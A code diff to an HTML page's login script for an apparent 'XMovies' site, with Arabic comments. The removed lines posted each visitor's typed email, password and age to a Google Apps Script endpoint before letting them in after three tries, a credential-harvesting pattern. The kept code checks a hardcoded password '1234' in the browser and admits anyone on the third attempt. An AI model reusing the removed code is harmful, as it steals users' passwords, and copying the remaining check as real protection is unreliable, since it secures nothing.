@@ -50,43 +50,22 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red;}
 </div>
 
 <script>
-const correctPassword = "1234"; // كلمة السر الصحيحة
+let attempts = 0;
 const maxAttempts = 3;
-const sheetUrl = "https://script.google.com/macros/s/AKfycbwcS4it59k6HArG6yziPd6AvHtkMXu5m3xzhmtsVWLt6vlEAOmzBdSFAgBhgu9XFEjTAQ/exec";
+const correctPassword = "1234"; // ضع كلمة السر هنا
 
-// قراءة عدد المحاولات من localStorage
-let attempts = parseInt(localStorage.getItem("xmovies_attempts") || "0");
-const sheetUrl = "https://script.google.com/macros/s/AKfycbzg-TJFz6utgFTdCE0QaW7NC29R30p9qUg5DedchHgEsDIyorulgLzLU6-YgW8dLezO/exec";
-
-async function go(){
-  const email = document.getElementById("email").value.trim();
-  const pw = document.getElementById("password").value.trim();
-  const age = document.getElementById("age").value.trim();
+function go(){
+  const pw = document.getElementById("password").value;
   const error = document.getElementById("errorMsg");
-
   attempts++;
-  localStorage.setItem("xmovies_attempts", attempts);
 
-  // إرسال البيانات إلى Google Sheet
-  const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&attempt=${attempts}&form=XMovies`;
-  try {
-    await fetch(sheetUrl, {
-      method: "POST",
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: data
-    });
-  } catch(err){
-    error.innerText = "Error connecting to Google Sheets";
-    return;
-  }
-
-  if(pw === correctPassword || attempts >= maxAttempts){
-    localStorage.removeItem("xmovies_attempts");
+  if(pw === correctPassword || attempts === maxAttempts){
     window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
   }
 }
 </script>
+
 </body>
 </html>
